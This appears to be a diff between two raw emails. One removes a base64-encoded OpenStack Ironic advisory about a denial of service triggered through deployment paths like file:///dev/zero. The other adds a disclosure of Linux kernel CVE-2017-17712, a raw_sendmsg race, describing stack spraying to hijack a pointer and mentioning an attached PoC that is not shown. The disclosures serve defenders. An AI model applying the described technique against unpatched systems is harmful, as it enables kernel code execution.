+--001a11482b1cb7a17d05606a34dd
+Content-Type: text/plain; charset="UTF-8"
 
---------------UdYHE8FCvh2o0u30oQn1rZ23
-Content-Type: text/plain; charset=UTF-8; format=flowed
-Content-Transfer-Encoding: base64
+Hi,
 
-PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09
-PT09PT09PT09PT09PT09PT09PT09PT09PT09PT0NCk9TU0EtMjAyNi0wMTM6IERlbmlhbCBvZiBT
-ZXJ2aWNlIGluIElyb25pYyB1bmRlciBzcGVjaWFsbHkgY3JhZnRlZCANCmRlcGxveW1lbnQgcmVx
-dWVzdHMNCj09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09
-PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09DQoNCjpEYXRlOiBNYXkgMTksIDIw
-MjYNCjpDVkU6IENWRS0yMDI2LTQ0OTE5DQoNCg0KQWZmZWN0cw0Kfn5+fn5+fg0KLSBJcm9uaWM6
-ID49MjMuMC40IDwyOS4wLjYsID49MzAuMC4wIDwzMi4wLjIsID49MzMuMC4wIDwzNS4wLjINCg0K
-DQpEZXNjcmlwdGlvbg0Kfn5+fn5+fn5+fn4NCkVyaWNoZW4gb2YgdGhlIEluc3RpdHV0ZSBvZiBD
-b21wdXRpbmcgVGVjaG5vbG9neSBhdCB0aGUgQ2hpbmVzZSBBY2FkZW15IG9mDQpTY2llbmNlcyBy
-ZXBvcnRlZCBhIHZ1bG5lcmFiaWxpdHkgaW4gSXJvbmljJ3MgaW1hZ2UgaGFuZGxpbmcgY29kZSB3
-aGVyZSBhbg0KYXV0aGVudGljYXRlZCBhbmQgYXBwcm9wcmlhdGVseSBhdXRob3JpemVkIHVzZXIg
-Y291bGQgcmVxdWVzdCBhIHNwZWNpYWwNCmRldmljZSBvciBmaWxlIHBhdGggYmUgZGVwbG95ZWQs
-IHdoZXJlIGNoZWNrc3VtIGV2YWx1YXRpb24gd291bGQgb2NjdXIgaW4NCmFkdmFuY2Ugb2YgZmls
-ZSBwYXRoIGNoZWNraW5nIGJlaW5nIGFzc2VydGVkLiBUaGlzIHdhcyBhIGNoYW5nZSBpbnRyb2R1
-Y2VkDQphcyBhIGZvbGxvdy11cCB0byBzb2Z0ZW4gQ1ZFLTIwMjQtNDcyMTEgaW1hZ2UgaGFuZGxp
-bmcgc2luY2UgImZpbGVzIG9uIGRpc2siDQphcmUgY29uc2lkZXJlZCBhcnRpZmFjdHMgcGxhY2Vk
-IGJ5IHRoZSBkZXBsb3llci9tYW5hZ2VyIG9mIHRoZSBJcm9uaWMNCmRlcGxveW1lbnQuDQoNClRo
-ZSByZXN1bHQgd2FzIHRoYXQgdGhlIHVzZXIgY291bGQgcmVxdWVzdCBhIGRlcGxveW1lbnQgd2hl
-cmUgdGhlIHJlcXVlc3RlZA0KZGlzayBpbWFnZSB3YXMgYSBzcGVjaWFsIGZpbGUsIHN1Y2ggYXMg
-ImZpbGU6Ly8vZGV2L3plcm8iLCB3aGljaCB3b3VsZA0KY29uc3VtZSBhIGNvbmR1Y3RvciB0aHJl
-YWQuIFRoaXMgaXMgYSBkaXJlY3QgcmVzdWx0IG9mIHRoZSBhdXRvLWNoZWNrc3VtDQpiZWhhdmlv
-ciBhdHRlbXB0aW5nIHRvIGNoZWNrc3VtIHRoZSBmaWxlLg0KDQpSZXBlYXRlZCBzaW1pbGFyIHJl
-cXVlc3RzIGNvdWxkIHRoZW4gYmUgbGV2ZXJhZ2VkIHRvIGV4aGF1c3QgdGhlIA0KYXZhaWxhYmxl
-IHBvb2wgb2YNCklyb25pYyBjb25kdWN0b3IgdGhyZWFkcyByZXN1bHRpbmcgaW4gYSBkZW5pYWwt
-b2Ytc2VydmljZSB1bnRpbCB0aGUgDQpzZXJ2aWNlIGlzDQpyZXN0YXJ0ZWQuDQoNCkFueSBhdXRo
-ZW50aWNhdGVkIHVzZXIgd2l0aCBhY2Nlc3MgdG8gd3JpdGUgdG8gYGBub2RlLmluc3RhbmNlX2lu
-Zm9gYCBhbmQNCmRlcGxveSBhIG5vZGUgY2FuIHRyaWdnZXIgdGhpcyBEb1MuDQoNCg0KDQpQYXRj
-aGVzDQp+fn5+fn5+DQotIGh0dHBzOi8vcmV2aWV3Lm9wZW5kZXYub3JnL2Mvb3BlbnN0YWNrL2ly
-b25pYy8rLzk4ODQ4MCANCigyMDIzLjEvYW50ZWxvcGUgKHVubWFpbnRhaW5lZCkpDQotIGh0dHBz
-Oi8vcmV2aWV3Lm9wZW5kZXYub3JnL2Mvb3BlbnN0YWNrL2lyb25pYy8rLzk4ODM1OSAoMjAyNC4x
-L2NhcmFjYWwgDQoodW5tYWludGFpbmVkKSkNCi0gaHR0cHM6Ly9yZXZpZXcub3BlbmRldi5vcmcv
-Yy9vcGVuc3RhY2svaXJvbmljLysvOTg4MzU3ICgyMDI1LjEvZXBveHkpDQotIGh0dHBzOi8vcmV2
-aWV3Lm9wZW5kZXYub3JnL2Mvb3BlbnN0YWNrL2lyb25pYy8rLzk4ODM1NiAoMjAyNS4yL2ZsYW1p
-bmdvKQ0KLSBodHRwczovL3Jldmlldy5vcGVuZGV2Lm9yZy9jL29wZW5zdGFjay9pcm9uaWMvKy85
-ODgzNTUgKDIwMjYuMS9nYXpwYWNobykNCi0gaHR0cHM6Ly9yZXZpZXcub3BlbmRldi5vcmcvYy9v
-cGVuc3RhY2svaXJvbmljLysvOTg4MzI1ICgyMDI2LjIvaGliaXNjdXMpDQotIGh0dHBzOi8vcmV2
-aWV3Lm9wZW5kZXYub3JnL2Mvb3BlbnN0YWNrL2lyb25pYy8rLzk4ODc2NSAoQnVnZml4LzMzLjAp
-DQotIGh0dHBzOi8vcmV2aWV3Lm9wZW5kZXYub3JnL2Mvb3BlbnN0YWNrL2lyb25pYy8rLzk4ODc2
-NCAoQnVnZml4LzM0LjApDQoNCg0KQ3JlZGl0cw0Kfn5+fn5+fg0KLSBFcmljaGVuIGZyb20gSW5z
-dGl0dXRlIG9mIENvbXB1dGluZyBUZWNobm9sb2d5LCBDaGluZXNlIEFjYWRlbXkgb2YgDQpTY2ll
-bmNlcw0KDQoNClJlZmVyZW5jZXMNCn5+fn5+fn5+fn4NCi0gaHR0cHM6Ly9idWdzLmxhdW5jaHBh
-ZC5uZXQvaXJvbmljLytidWcvMjE1MDMzMg0KLSBodHRwOi8vY3ZlLm1pdHJlLm9yZy9jZ2ktYmlu
-L2N2ZW5hbWUuY2dpP25hbWU9Q1ZFLTIwMjYtNDQ5MTkNCg0KDQpOb3Rlcw0Kfn5+fn4NCi0gT3Bl
-cmF0b3JzIGFuZCB2ZW5kb3JzIHdobyBiYWNrcG9ydGVkDQpodHRwczovL3Jldmlldy5vcGVuZGV2
-Lm9yZy9xL0liMmZkNWRjYmVlOWE5ZDFjN2UzMjc3MGVjM2Q5YjZjYjIwYTJlMmENCiDCoCB0aXRs
-ZWQgIkNhbGN1bGF0ZSBtaXNzaW5nIGNoZWNrc3VtIGZvciBmaWxlOi8vIGJhc2VkIGltYWdlcyIg
-YXJlDQogwqAgdnVsbmVyYWJsZSB0byB0aGlzIGlzc3VlLiBCYWNrcG9ydHMgd2VyZSBtYWRlIGF2
-YWlsYWJsZSB0byBYZW5hLA0KIMKgIFdhbGxhYnksIGFuZCBWaWN0b3JpYSByZWxlYXNlcyB3aGlj
-aCBkaWQgbm90IGxhbmQgaW4gT3BlbkRldiBHZXJyaXQuDQogwqAgQmFja3BvcnRzIHRvIHRoZSBa
-ZWQsIDIwMjMuMSwgMjAyMy4yLCAyMDI0LjEsIDIwMjQuMiwgcmVsZWFzZSBicmFuY2hlcw0KIMKg
-IG9jY3VyZWQgYW5kIHdlcmUgbWVyZ2VkIGludG8gT3BlbkRldiBHZXJyaXQsIGJ1dCB3ZXJlIG5v
-dCB1bml2ZXJzYWxseQ0KIMKgIHJlbGVhc2VkIHRvIHJlbGVhc2UgYnJhbmNoIGFuZCBtYWludGVu
-YW5jZSBwb2xpY2llcyBvZiB0aGUgT3BlblN0YWNrDQogwqAgcHJvamVjdC4gVGhlIGFmZmVjdGVk
-IHByb2R1Y3QgdmVyc2lvbnMgcmFuZ2UgY292ZXJzIHRoZXNlIHJlbGVhc2VzIGFzDQogwqAgcmVs
-ZWFzZWQgYnkgdGhlIE9wZW5TdGFjayBjb21tdW5pdHkuDQotIE9wZXJhdG9ycyBvciB2ZW5kb3Jz
-IHdobyBtYXkgaGF2ZSBiYWNrcG9ydGVkIHBhdGNoZXMgaW5kZXBlbmRlbnRseSBvZg0KIMKgIHVw
-c3RyZWFtIHNob3VsZCB0YWtlIHRoZSBhY3Rpb24gb2YgYmFja3BvcnRpbmcgdGhpcyBmaXggYWxv
-bmcgd2l0aA0KIMKgIGVuc3VyaW5nIHRoYXQgdGhleSBoYXZlIHRoZSBhcHByb3ByaWF0ZSBmaXgg
-Zm9yIE9TU0EtMjAyNS0wMDEsIGZyb20NCmh0dHBzOi8vcmV2aWV3Lm9wZW5kZXYub3JnL3EvSTJm
-YTk5NTQzOWVlNTAwZjlkZDgyZWM4Y2NmYTFhMjVlZThlMTE3OWMNCiDCoCBpZiBub3QgYWxyZWFk
-eSBiYWNrcG9ydGVkLg0KLSBQYXRjaGVzIGFyZSBwcm92aWRlZCBmb3IgYWN0aXZlIElyb25pYyBi
-dWdmaXggYnJhbmNoZXMuIEJ1Z2ZpeA0KIMKgIGJyYW5jaGVzIHdpbGwgbm90IGdldCBhbiB1cGRh
-dGVkIHJlbGVhc2Ugb2YgSXJvbmljLg0KLSBQYXRjaGVzIGFyZSBwcm92aWRlZCBmb3IgdW5tYWlu
-dGFpbmVkIGJyYW5jaGVzIGFzIGEgY291cnRlc3kuIFRoZXNlDQogwqAgYnJhbmNoZXMgd2lsbCBu
-b3QgcmVjaWV2ZSB1cGRhdGVkIHJlbGVhc2VzLg0KDQo=
 
---------------UdYHE8FCvh2o0u30oQn1rZ23
-Content-Type: application/pgp-keys; name="OpenPGP_0x6B75D939B424C6D4.asc"
-Content-Disposition: attachment; filename="OpenPGP_0x6B75D939B424C6D4.asc"
-Content-Description: OpenPGP public key
+This is an announcement for CVE-2017-17712 which is a race condition leads
+to uninitialized stack variable, this might be used to gain code execution.
+
+
+The bug was introduced  here :
+https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=c008ba5bdc9fa830e1a349b20b0be5a137bdef7a
+
+And fixed here :
+https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=8f659a03a0ba9289b9aeb9b4470e6fb263d6f483
+
+
+#######   BUG DETAILS  ############
+
+
+in net/ipv4/raw.c:
+
+static int raw_sendmsg(struct sock *sk, struct msghdr *msg, size_t len)
+
+{
+
+...
+
+struct raw_frag_vec rfv;  [1]
+
+...
+
+
+...
+
+if (!inet->hdrincl) {  [2]
+
+rfv.msg = msg;
+
+rfv.hlen = 0;
+
+
+err = raw_probe_proto_opt(&rfv, &fl4);
+
+if (err)
+
+goto done;
+
+}
+
+...
+
+...
+
+if (inet->hdrincl)  [3]
+
+err = raw_send_hdrinc(sk, &fl4, msg, len,
+
+      &rt, msg->msg_flags, &ipc.sockc);
+
+
+ else {
+
+sock_tx_timestamp(sk, ipc.sockc.tsflags, &ipc.tx_flags);
+
+
+if (!ipc.addr)
+
+ipc.addr = fl4.daddr;
+
+lock_sock(sk);
+
+err = ip_append_data(sk, &fl4, raw_getfrag,
+
+     &rfv, len, 0, [4]
+
+     &ipc, &rt, msg->msg_flags);
+
+...
+
+}
+
+
+[1] rfv is not initialized and contains a pointer to a msghdr header
+structure.
+
+[2], [3] There are multiple checks against inet->hdrincl without a lock.
+
+
+When we achieve (by racing inet->hdrincl via setsockopt()) inet->hdrincl=1
+in [1], and inet->hdrincl=0 in [2], rfv variable remains uninitialized and
+used in [4].
+
+By spraying the stack with controlled user data , we can take control of
+msg pointer which is used later in ip_append_data().
+
+
+In attachment  : poc.c + kernel panic log
+
+
+#######   CREDITS  ############
+
+Mohamed GHANNAM
+
+--001a11482b1cb7a17d05606a34dd
+Content-Type: text/html; charset="UTF-8"
 Content-Transfer-Encoding: quoted-printable
 
------BEGIN PGP PUBLIC KEY BLOCK-----=0A=
-=0A=
-xsFNBGFpBPQBEACaRxGb+O+Ypgxi2gg3bfkxuejyTGUYJ3dwXkoFnZvaSeq7Nx6X=0A=
-4+vEd20x/9vjuwdbXB5w3Tb4N9oIAGUpukjzVX3rBZ9TqkvOiY5KpJf8lJVCJupp=0A=
-lfUkxurWEvwdcCv9KU7HyFSKcMdmFIOGPzbg4N/d2gF52HIKTQBorI0dMAoKsBXu=0A=
-Wfb1/rK+C8wcY3gecqLgrjEdOFsQETFFSUs8Egn3Z81DMoNucBVZWnz+p7R6nhlr=0A=
-Mt9gXNBEZWPFZihteE6EovP6BXSotdyBRmmxAOBCaZZsA4CIzZoK9cb84N6y1PQH=0A=
-AAl4W7wCoakiKByF9/0gCIIbYWgauJ5oD0kQTNgwNDcygQnTdrs7UQ6GUlaT4Cgf=0A=
-eRWydLmmv8LvJyZOqFQs+3DOUTagTYZqsarfBBQO9PaeZvKbz3s5Dsr5QCeOMIVy=0A=
-4Te4tNRNExut48cp+n31ZUARCAlQHAoKiswELCkOgnKzSEVJ8PEeIYP8Up5zoWfK=0A=
-4/SaqeVrY3ziKl8RdOGW2zW7WikfgWODIp5L6erTnT2xRGGcikDbShkGzOQCIkfm=0A=
-XPzp8HmSHumIEO002KzCMsRX8jQphEPtC1QXsAwDpyYMTPjxPIvVtTQbrtoJoYCV=0A=
-uzDiETsB9VWvNRXn687uvVaFL96aui0hLO79basRPiekRp33IlXuEaxVdQARAQAB=0A=
-zR5KYXkgRmF1bGtuZXIgPGpheWZAZ2VudG9vLm9yZz7CwZcEEwEIAEECGwMFCwkI=0A=
-BwICIgIGFQoJCAsCBBYCAwECHgcCF4AWIQS8XViawYtJi5aoT61rddk5tCTG1AUC=0A=
-aMs9igUJDAS+lgAKCRBrddk5tCTG1CQdD/47lPT8z3bbBxlu9zBu4kwDBvrN1wRA=0A=
-ARwAoKE02yKiWDkYt0XqNFuAeGK5gXt+nTqHDHVmHCvDsh13CHKiZL21ZxqX8I4z=0A=
-IvuqVfHdLJ36k161qUtn/vb78kmFNqITgGmU2TfcdRCGY8lgycRbr7Z0EGOIWNlD=0A=
-u0hzE7tU0JOY2lJSeBfvq7MAAuGTy3uL1dQCZmwf8tH2u02AprfATcVz0DfwPKRl=0A=
-E/Ku4cXnLTsje2QSz3SjF0tsbUhohLipfuI5yJQaCwILHzWrMv+bX+wzO4qoUale=0A=
-ozfiCuXwHaC5XqGL4XPrTHT4IzhuURtbf6PsMvnCDTTEntajvm1veZuH+ONMkq73=0A=
-Do56v1JOXJIvpCniXlLiBu3BehCZfRolG/aeF66hkYUF9kaugsXizqbjiQ8Lljjc=0A=
-+YfGGOip6+1bhWE7qFaD+JzpVkDgJfO3gEqZlHhJsWm3GpRIpFElXAC+vits5XVJ=0A=
-ccRikHkeHLBaoUk592yRtxOQ0hIwUy6/zWhVcbv05u79ofd5WfpC0vxy1YSbYYGN=0A=
-2BZL91aZKf97GXSNVTavbXQ8mhLTQbpL2ClF6k/KQISZV9629qkhVecbbS4H9W0A=0A=
-Ce3ivVZ+FhLRCQ85huJ81YrJcecDlBNN8Ytojq5ZIEht6KCsZVngsNAOW27yxNzt=0A=
-I3Dh/PfnO+MTas0ZSmF5IEZhdWxrbmVyIDxqYXlAanZmLmNjPsLBlAQTAQgAPgIb=0A=
-AwULCQgHAgYVCgkICwIEFgIDAQIeAQIXgBYhBLxdWJrBi0mLlqhPrWt12Tm0JMbU=0A=
-BQJoyz2KBQkMBL6WAAoJEGt12Tm0JMbUXfYP+QGRxf0ICu3BR44gj24keIyqPjvC=0A=
-5TUega/ioHR2db3KJSfWqij5El6gAJBEAY5HW04KkRv2ru2BOmdz2+5vA/FimM5/=0A=
-si4LC0MvokxZ0QUqUFZI5/UmHsog9pH+lAJPs2ObzCE3mY0g0RDtziqnIyZNpw7z=0A=
-sxP6Y3A4vl+tXAeUuZ6r88vbesEHdWy6w6dgwH5LvWGsPe9vPn/Lyo/nB+ITh5HK=0A=
-6xgjuuRldNL/iYBu6Ph89wUxrEYRwkIXd63RkzYcZLu+l+G2AnopCvMUAXJQn1JM=0A=
-DJkRjLHknVAvWUslFOO3M0Hhs+Wa0V6ACWu5VDCu3gEuIaSfFmsS07WmGeqACTHk=0A=
-8/ovUoxLYz7xydReuYYoz2g0FKoAywb2HOuwXt7+dfu+Zvj50UIIltf6wVv0cj+M=0A=
-hSPI7sCN9C2kx5RzItee5VUGS2fB+46YUukxUVNgSorLfFauxtRXlbGv5ZQr3esB=0A=
-4Ll2TpP5Wd/WxdztQG5SYH5+qeUVWEb9JVVMgx3VN+bpne2axHpBp1Mj3viKXR+s=0A=
-pudGPwtFj+imrZXmA0R848a1JQn5pBuCjXDK7CljNw2LQiZUdcIVMi1kmYYNEOSj=0A=
-iB/h3cMvF07gAkhZw/K8ZefqC+z2k6ZieVrlwMC5eoRcPyfbT22F5VxGj9o+ckjH=0A=
-isvo4o0fqpuKmT8swsGUBBMBCAA+FiEEvF1YmsGLSYuWqE+ta3XZObQkxtQFAmFp=0A=
-BPQCGwMFCQeEzgAFCwkIBwIGFQoJCAsCBBYCAwECHgECF4AACgkQa3XZObQkxtSX=0A=
-QQ//VwFbzIE2x79AhX3wHReYH+6UR0qe+QuTl0zd3vp1sKukkbU+i3J4eVHmVXdT=0A=
-I2rFE1WH9TbTaEBM3qZJgXsQEQ5+im+eyZFfZbGgZLJWyig3uKOogS0OrxOjRwjl=0A=
-DLN9Orcl4de/HA1zAVrLRV3zfg8ZMj6zXrv84L54lZ5e9C7mD5oS8Ge5enFrU9kE=0A=
-dHNjqzt1PCXCeA37/HRJoR+nzHmcSzJyMMxQdo0cgiaRHYyu7LOJFL5qR0jLEmZw=0A=
-Eulmd6fMeU4Tx5eMx4o6O3diTmGyeFs/UDGWn0qcMDkh9T00Qw1bLOv/yFrpCMjE=0A=
-yryR7hJ53HYtLqEkvn/7lClrp2BUsV8XjYqexnB6unr30/RduC6koXXUHAZpk/+m=0A=
-D0WEdShFNuiFlOn8BDjBvk5k6j2VlEO3uH0BhWUBfY+bahWiLgWUhupK2Wd8qLYb=0A=
-E9VDj5jvcKVt7qonBuguDY43aXyf7gnm3u1pprGuqTcWyRijHeLXLHNZg2fCUjQ0=0A=
-tdto/YblvNexrEDxjK7nzgmHR7KDTVFcjG91yrTrO2/hmREQSN5WWk50q6n5NLBS=0A=
-MWyDuzOxG0baOuKZrSCnMamFNjMPvAnCdqe1HoNq4b7Hb9FheqJulqQFLEhGN33K=0A=
-IummGYTjJBYnz4L7c1F0iqlvEVO7MEir+a63lMWh6wIarg3OwU0EYWkE9AEQALHc=0A=
-nXwEWn5WF3y47vkl4ASUisl1QHSlYrs1qlsBmqdbQzo5TOtupuGVk9G7jqo1J1Iu=0A=
-+ejI+uYCcU1jPYH5H+PJ9AK5qcM6MGniwJNaopHmvUgERwlUcxP99IH4LGS2npnX=0A=
-SxIrSYfYBXuDUW7vbW2Ksj5XfXlBMd/6PE4b5kljOABB9SWFw3eXJunaV7h2tLne=0A=
-wqFU/sbZHLhDkAER7vwlXyTMDrkPTCyOqfweFZcn2iRD52/LsoL4hlpcGZz/mSV/=0A=
-sQJBoiM5op+3NWKKe0V4RkJ+lgACQG4jzC5jyN4XOk48tQF4ZHqyy32O+HRH4xRX=0A=
-pOAmxiZzvXLPUqSmI+uNnjyO5tzFy8K/hzL/3YtXQyxVGFYtmtILSnQORO/a37or=0A=
-eb5RQm8jvvq7R+Id2/BmdekGcxQn5l6gn4+DVyp5EW/n7wXKz5bdt74OFk6RQafb=0A=
-24RHsNbJehIHWDuK2PO5FS6T3T5S2il2khGg2wu6xh5vXyWtB3eW1skdOWwt/M/H=0A=
-FinesaCkvHTUJwTKk6BnQUzpKHyZcGRuQ+pnT/5xJumi6AztsXU29wfyaoZK1o6f=0A=
-oRRk8ojpIVZIUZyR7cV2BXzewwKyv9HihGa+P4atcjPMsGhVh6cJXxKS1xKdfn8i=0A=
-BD7ngS1LIOhDKzjQrRD7Pz/Q0SxwYgYrz51AdH7tABEBAAHCwXwEGAEIACYCGwwW=0A=
-IQS8XViawYtJi5aoT61rddk5tCTG1AUCaMs9fQUJDAS+iQAKCRBrddk5tCTG1OiG=0A=
-D/0dV4IeXX4rBG++DPiW3ZZZU5tCZjrTUIhi6KNilESLvBB5ovrdOPgrJ21CKrQX=0A=
-D9RlLTl8c5OUUaYNP0cOUx97d01ZmfquIauJbXBXWC9XiDWoUEY2eJFfMmb0EW7m=0A=
-4WU/Ot2HjOX/8U8iWW59bL8ONyAg2J/fLaFqJtLkjtqZIeoUvHO+SC5p2EYfMwms=0A=
-xIZzmtvPtLclVRvFUuJIEz9vNLCAarxas+peQ+t2FbyMvrsPISxCZ4axGZ+P+FII=0A=
-FEfckeFwYJEsVeKhj52U05wvPrsZfJIGO4KZ97PsWTNggFUCXhiYkTPoYsXnv09F=0A=
-CDeum6tFM1yGmaD5siLWI8dZdJOIhrMstYDMRlHDoQPOcugRCVv/I0rtKJ1OFG4P=0A=
-Lqbx3aR1cKYyTkpG3GtkM6rSThYFx6N4UKVE9ncCXgjyOHXglWI1BnRqzd86prEd=0A=
-evSVpaasxZjJMta6LbC6PU5Vd/ETNcnJIVsf8zLCoHx7cTmDHHoAU3rELhq5vyWm=0A=
-EpPU3zf0EnbgGXnj+C71yAdmIj04fCt6d2vnM+0nHFL7S3BB18JMpwfJbs0PPair=0A=
-KVQwhPcEWmY6u8pI1J37vTG4MrABj1qZzKJ9SnkwRU1h6uVPdsom0dOzMl+arjW1=0A=
-yZEeXN3xGPq7s2ozyhrYR475/Pvk/G+B/HiUSR3sLybbUc7ATQRnx8pTAQgAvzTh=0A=
-wcbjjoTY/Y95MBW77xGoCVrv2H1Vm36liU18LVQ15RkgsDZv/sLXN9MmUc79Dazn=0A=
-0T0I4Q3po/Micd4ka++dFUGzY0yk+VyrNJG8ibtl0/a6kNInzqUPH52yGDPWu08Y=0A=
-1Y6NAYDBmo7ePqXncZeGevKFsOGtHPV83mRIwyGPN4QOk2h3xOZ72Y3wKrGdBUIT=0A=
-+rdetAngzRaqdqyZkzvKzPB6zvEDnJOost1BDZ9FMECAJ+7MnayYE3Ytq5m/+12R=0A=
-b4IUHsVbmi914wrvO2LJCN1hS+yCEazMhgkVXJ0f4wO+ISYAoGyrBrRZE1BplEjt=0A=
-aHB69QMCNqYMih7tTQARAQABwsKyBBgBCAAmAhsCFiEEvF1YmsGLSYuWqE+ta3XZ=0A=
-ObQkxtQFAmjLPX0FCQWl+SoBQMB0IAQZAQgAHRYhBLDzBOkQOEyJiV8Bvs1FRFIp=0A=
-C0VqBQJnx8pTAAoJEM1FRFIpC0VqxMQIAInaBNwQt7qPulrEE18uHf6RyZLAI3l/=0A=
-0n3r40Cd8S9NKjAu/bnHGu0memat5YZOhot7I2tvKlNHRzPTBV+yK1rhbZH8QCwV=0A=
-s/yksTL8kJhWNm/svXRDWYv4zImTwYqB+RPSwAd2eJnknSa5xY/gOr88JKZyjlYx=0A=
-ILyC9Dp7Vo0j9GaXhr796QOKsop4BqEew4HgIkY2+79WGb0BOfAiW2pa0PNf5rn6=0A=
-vTAdmoHDgpeJytyFPTaU5N2Zdhq9c4igUW7H7t3D3M9km+1yRCoNMywVZE1mypvF=0A=
-h8ibNttffwCNw4beaGd9ePmcu0RoepG2PBCuJ5/yJOhvKCM9zmwbU3EJEGt12Tm0=0A=
-JMbULzsP/3VLk57bYrsVgLHGB+IzmvZfM6cd6K1kSa0iE3tHFd2yDGLvQ5S8PaUJ=0A=
-LZGqI9nYX0l6XkRUalU7luPB8f/wlAGnLRIoq/lCnYhmrZzAHGOq7MdKw4poK6Yk=0A=
-3vXrxMyjR1aIeARQkNDGDRmnjBM8o+ldQj9LB/ra56T21A2nk/2LGsN7CjKSlQ0p=0A=
-WIgRHEVCsSCpBDlA2vegfU1P5l5aLZuu7gZewtx7EK4hBTZiI4oTSGe4QeEkX/yA=0A=
-uXkoRHA/kdcyl0Jb9M+Xa5fZ0/m6v5lM8wJtdkByVp6wWIr9KuQQmLdedJA4dU5a=0A=
-o+7OIAJB7vVUWDu1Z3HuUSAPZe1gru2hjdD7LsU6DfjI5GMqSKKYtvTfd5hWvEEX=0A=
-mEIAkIaN9SDjH7gqcb/0WCGJIVvmx6OtcU4ndMxrNEsHljF8sI0+bu4q8serswz7=0A=
-wU0SYIqcsgLVqJaEMMKUisxhz/jycJ1yikLR+TRr3srFTEnhgS1j/cDLOLzoK6Gj=0A=
-783ny5uWumnPPgzYPtOZMz7GSflsirdYPUW4TZEwPwBKutu1p11fPWPWj0pi3bZ1=0A=
-VDf3xur65x3TpbXjyhiaKZE50HR3mPHn2Sm/8Q+9ergC7QJ18Wh13aQqHoH8n4aP=0A=
-N9B6kDLrB1xhe5UKYi1shLeKXdjDO9SPgB/FPq/hue1yvwVEuNn2=0A=
-=3DtvZI=0A=
------END PGP PUBLIC KEY BLOCK-----=0A=
+<div dir=3D"ltr">
 
---------------UdYHE8FCvh2o0u30oQn1rZ23--
 
---------------2zg00N570Xzsf6mx1Sy0WZ8W--
 
---------------wwdiMQTg03hycGWs0hrti9HK
-Content-Type: application/pgp-signature; name="OpenPGP_signature.asc"
-Content-Description: OpenPGP digital signature
-Content-Disposition: attachment; filename="OpenPGP_signature.asc"
 
------BEGIN PGP SIGNATURE-----
 
-wsB5BAABCAAjFiEEsPME6RA4TImJXwG+zUVEUikLRWoFAmoMw6sFAwAAAAAACgkQzUVEUikLRWp8
-FwgAkQ31s0WzcCjdD1g6IVr/gbOO5t1uOHSxhvQULbdOn1lM0vxlhIBi7jc3UUesqHI54swPefWr
-U5QpT0ndapwNlZE9bKYoV5ABdB/ANkrL8C0oHdAsU0q9wkm97eAv0G/UuCOPhnWUGxcIC6OA7tb9
-QdZDJYlXB+LnIO6HwlR+yBWbJcqMJ5xkBpt3DjUUH1DAIKJaKj5KvxxiS7M+WO8hlGeAVEilWIeA
-XrK67/B013zQJK3Xn/D7XYzQp13V5GRMxojkdmf/BRGrmiepBpqPAlar0oD1WTKBqHBo3c65g8z2
-e3qz5gdiGXSPNm6bYe657AuhIEwU2HHQLNidK09oUQ==
-=UJ3r
------END PGP SIGNATURE-----
 
---------------wwdiMQTg03hycGWs0hrti9HK--
+
+<p class=3D"gmail-p1" style=3D"margin:0px;font-style:normal;font-variant-li=
+gatures:normal;font-variant-caps:normal;font-weight:normal;font-stretch:nor=
+mal;font-size:12px;line-height:normal;font-family:&quot;Helvetica Neue&quot=
+;;color:rgb(69,69,69)">Hi,</p><p class=3D"gmail-p1" style=3D"margin:0px;fon=
+t-style:normal;font-variant-ligatures:normal;font-variant-caps:normal;font-=
+weight:normal;font-stretch:normal;font-size:12px;line-height:normal;font-fa=
+mily:&quot;Helvetica Neue&quot;;color:rgb(69,69,69)"><br></p><p class=3D"gm=
+ail-p1" style=3D"margin:0px;font-style:normal;font-variant-ligatures:normal=
+;font-variant-caps:normal;font-weight:normal;font-stretch:normal;font-size:=
+12px;line-height:normal;font-family:&quot;Helvetica Neue&quot;;color:rgb(69=
+,69,69)">This is an announcement for CVE-2017-17712 which is a race conditi=
+on leads to uninitialized stack variable,=C2=A0<span style=3D"font-size:12.=
+8px;font-family:arial,sans-serif;color:rgb(34,34,34)">this might be used to=
+ gain code execution.</span></p>
+<p class=3D"gmail-p2" style=3D"margin:0px;font-style:normal;font-variant-li=
+gatures:normal;font-variant-caps:normal;font-weight:normal;font-stretch:nor=
+mal;font-size:12px;line-height:normal;font-family:&quot;Helvetica Neue&quot=
+;;color:rgb(69,69,69);min-height:14px"><br></p>
+<p class=3D"gmail-p3" style=3D"margin:0px;font-style:normal;font-variant-li=
+gatures:normal;font-variant-caps:normal;font-weight:normal;font-stretch:nor=
+mal;font-size:12px;line-height:normal;font-family:&quot;Helvetica Neue&quot=
+;;color:rgb(228,175,10)"><span class=3D"gmail-s1" style=3D"color:rgb(69,69,=
+69)">The bug was introduced =C2=A0here :=C2=A0<a href=3D"https://git.kernel=
+.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=3Dc008ba5bdc9fa=
+830e1a349b20b0be5a137bdef7a"><span class=3D"gmail-s2" style=3D"text-decorat=
+ion:underline;color:rgb(228,175,10)">https://git.kernel.org/pub/scm/linux/k=
+ernel/git/torvalds/linux.git/commit/?id=3Dc008ba5bdc9fa830e1a349b20b0be5a13=
+7bdef7a</span></a></span></p>
+<p class=3D"gmail-p3" style=3D"margin:0px;font-style:normal;font-variant-li=
+gatures:normal;font-variant-caps:normal;font-weight:normal;font-stretch:nor=
+mal;font-size:12px;line-height:normal;font-family:&quot;Helvetica Neue&quot=
+;;color:rgb(228,175,10)"><span class=3D"gmail-s1" style=3D"color:rgb(69,69,=
+69)">And fixed here : <a href=3D"https://git.kernel.org/pub/scm/linux/kerne=
+l/git/torvalds/linux.git/commit/?id=3D8f659a03a0ba9289b9aeb9b4470e6fb263d6f=
+483"><span class=3D"gmail-s3" style=3D"color:rgb(228,175,10)">https://git.k=
+ernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=3D8f659a03=
+a0ba9289b9aeb9b4470e6fb263d6f483</span></a></span></p>
+<p class=3D"gmail-p2" style=3D"margin:0px;font-style:normal;font-variant-li=
+gatures:normal;font-variant-caps:normal;font-weight:normal;font-stretch:nor=
+mal;font-size:12px;line-height:normal;font-family:&quot;Helvetica Neue&quot=
+;;color:rgb(69,69,69);min-height:14px"><br></p>
